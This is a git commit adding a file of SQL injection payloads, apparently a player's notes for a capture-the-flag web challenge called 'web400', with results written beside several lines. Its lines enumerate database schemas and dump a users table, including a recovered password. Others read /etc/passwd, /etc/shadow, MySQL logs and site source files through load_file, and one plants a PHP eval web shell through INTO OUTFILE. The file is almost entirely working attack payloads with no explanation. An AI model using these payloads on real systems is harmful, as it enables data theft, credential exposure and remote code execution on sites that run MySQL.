c09a7106f580b80aae581adc7f294dfab54ab286
godspeedcurry <3160100421@zju.edu.cn>
2018-12-26 23:30:42 +0800

    Create mysql.sql

---
+++ web/sql/mysql.sql
@@ -0,0 +1,31 @@
+
+' or (1) union select count(*) from information_schema.tables#
+' or (1) union select user() from information_schema.tables#  root@localhost
+' or (1) union select database() from information_schema.tables#      web400
+admin' or (1) union select version() from information_schema.tables#          5.7.17-0ubuntu0.16.04.2
+-- ' or (1) union select passwd() from information_schema.tables# 
+' or (1) union select 1,2,group_concat(table_name) from information_schema.tables where schema_name='web400'
+
+' or (1) union SELECT COUNT(*) FROM information_schema.SCHEMATA#          5
+
+' or (1) union SELECT table_name from information_schema.TABLES WHERE TABLE_SCHEMA = 'web400'#
+' or (1) union SELECT COLUMN_NAME from information_schema.COLUMNS WHERE TABLE_NAME = 'USERS'#   username password data
+' or (1) union SELECT password from web400.USERS#   zhegemimanigujicaibuchulai
+' or (1) union SELECT username from web400.USERS#   admin
+' or (1) union SELECT data from web400.USERS#   
+
+  1' or (1) union select load_file('/etc/passwd')#
+  1' or (1) union select load_file('/etc/mysql/mysql.conf.d/mysqld.cnf')#
+  1' or (1) union select load_file('/var/run/mysqld/mysqld.pid')#
+  1' or (1) union select load_file('/var/log/mysql/error.log')#
+  1' or (1) union select load_file('/var/log/mysql/mysql.log')#
+  1' or (1) union select "<?php @eval($_POST['c']); ?>" into outfile("/etc/shell.php")#
+  1' or (1) union select load_file('migrate.php')#
+  1' or (1) union select load_file('/home/web/www.zjusec.com/index.php')#
+  1' or (1) union select load_file('/home/web/www.zjusec.com/rank.php')#
+  1' or (1) union select load_file('/home/web/www.zjusec.com/play.php')#
+  1' or (1) union select load_file('/home/web/www.zjusec.com/migrate.php')#
+  1' or (1) union select load_file('/home/web/www.zjusec.com/i-am-the-config-and-flag.php')#
+  1' or (1) union select load_file('/etc/shadow')#
+  1' or (1) union select load data infile '/home/web/www.zjusec.com/i-am-the-config-and-flag.php' into table web400#
+  /home/web/www.zjusec.com/migrate.php
